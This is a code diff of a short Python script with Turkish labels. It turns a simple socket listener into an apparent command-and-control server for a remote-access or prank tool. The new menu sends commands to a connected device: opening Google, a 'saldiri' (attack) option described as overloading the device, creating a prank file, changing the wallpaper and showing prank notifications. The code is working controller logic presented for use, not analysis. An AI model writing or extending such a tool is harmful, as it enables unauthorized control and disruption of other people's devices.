@@ -1,42 +1,44 @@
 import socket
-import argparse
 
-def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-p", "--port", type=int, help="Dinlenecek port numarası", required=True)
-    args = parser.parse_args()
-    PORT = args.port
+def komut_menusu():
+    print("""
+[ Komutlar ]
+1. google            → Google aç
+2. saldiri           → Cihazı kasar
+3. dosya             → saka.txt oluştur
+4. arkaplan <url>    → Arka plan değiştir
+5. saka <mesaj>      → Bildirim şakası
+6. exit              → Bağlantıyı kapat
+""")
 
+PORT = int(input("Port gir: "))
+
+s = socket.socket()
+s.bind(("0.0.0.0", PORT))
+s.listen(1)
+print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")
+
+conn, addr = s.accept()
+print(f"[+] Bağlantı geldi: {addr[0]}")
+
+gelen = conn.recv(1024).decode()
+print(gelen)
+
+komut_menusu()
+
+while True:
+    komut = input("Komut >> ").strip()
+    if komut == "":
+        continue
     try:
-        s = socket.socket()
-        s.bind(("0.0.0.0", PORT))
-        s.listen(1)
-        print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")
-    except Exception as e:
-        print(f"[!] Port hatası: {e}")
-        return
-
-    try:
-        client, addr = s.accept()
-        print(f"[✓] Bağlandı: {addr}")
-        print(client.recv(1024).decode())
-    except Exception as e:
-        print(f"[!] Bağlantı hatası: {e}")
-        return
-
-    while True:
-        try:
-            komut = input("Komut > ").strip()
-            if not komut:
-                continue
-            client.send(komut.encode())
-            if komut == "exit":
-                break
-            yanit = client.recv(4096).decode()
-            print(yanit)
-        except Exception as e:
-            print(f"[!] Bağlantı koptu: {e}")
+        conn.send(komut.encode())
+        if komut == "exit":
+            print("[✓] Bağlantı kapatıldı.")
             break
+        cevap = conn.recv(2048).decode()
+        print(cevap)
+    except:
+        print("[!] Cevap alınamadı veya bağlantı kesildi.")
+        break
 
-if __name__ == "__main__":
-    main()
+conn.close()
